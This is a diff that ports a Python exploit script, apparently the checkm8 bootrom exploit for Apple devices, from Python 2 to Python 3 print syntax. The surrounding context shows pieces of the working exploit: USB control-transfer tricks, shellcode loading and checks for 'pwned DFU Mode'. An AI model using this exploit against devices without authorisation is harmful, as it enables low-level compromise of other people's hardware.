@@ -1,3 +1,4 @@
+from __future__ import print_function
 import array, ctypes, struct, sys, time
 import usb
 import dfu
@@ -26,7 +27,7 @@ def libusb1_create_ctrl_transfer(device, request, timeout):
 
 def libusb1_async_ctrl_transfer(device, bmRequestType, bRequest, wValue, wIndex, data, timeout):
   if usb.backend.libusb1._lib is not device._ctx.backend.lib:
-    print 'ERROR: This exploit requires libusb1 backend, but another backend is being used. Exiting.'
+    print('ERROR: This exploit requires libusb1 backend, but another backend is being used. Exiting.')
     sys.exit(1)
 
   global request, transfer_ptr, never_free_device
@@ -100,7 +101,7 @@ def prepare_shellcode(name, constants=[]):
     fmt = '<%sQ'
     size = 8
   else:
-    print 'ERROR: Shellcode name "%s" does not end with known architecture. Exiting.' % name
+    print('ERROR: Shellcode name "%s" does not end with known architecture. Exiting.' % name)
     sys.exit(1)
 
   with open('bin/%s.bin' % name, 'rb') as f:
@@ -454,20 +455,20 @@ def exploit_config(serial_number):
       return payload(config.cpid), config
   for config in all_exploit_configs():
     if 'CPID:%s' % config.cpid in serial_number:
-      print 'ERROR: CPID is compatible, but serial number string does not match.'
-      print 'Make sure device is in SecureROM DFU Mode and not LLB/iBSS DFU Mode. Exiting.'
+      print('ERROR: CPID is compatible, but serial number string does not match.')
+      print('Make sure device is in SecureROM DFU Mode and not LLB/iBSS DFU Mode. Exiting.')
       sys.exit(1)
-  print 'ERROR: This is not a compatible device. Exiting.'
+  print('ERROR: This is not a compatible device. Exiting.')
   sys.exit(1)
 
 def exploit():
-  print '*** checkm8 exploit by axi0mX ***'
+  print('*** checkm8 exploit by axi0mX ***')
 
   device = dfu.acquire_device()
   start = time.time()
-  print 'Found:', device.serial_number
+  print('Found:', device.serial_number)
   if 'PWND:[' in device.serial_number:
-    print 'Device is already in pwned DFU Mode. Not executing exploit.'
+    print('Device is already in pwned DFU Mode. Not executing exploit.')
     return
   payload, config = exploit_config(device.serial_number)
 
@@ -508,8 +509,8 @@ def exploit():
 
   device = dfu.acquire_device()
   if 'PWND:[checkm8]' not in device.serial_number:
-    print 'ERROR: Exploit failed. Device did not enter pwned DFU Mode.'
+    print('ERROR: Exploit failed. Device did not enter pwned DFU Mode.')
     sys.exit(1)
-  print 'Device is now in pwned DFU Mode.'
-  print '(%0.2f seconds)' % (time.time() - start)
+  print('Device is now in pwned DFU Mode.')
+  print('(%0.2f seconds)' % (time.time() - start))
   dfu.release_device(device)
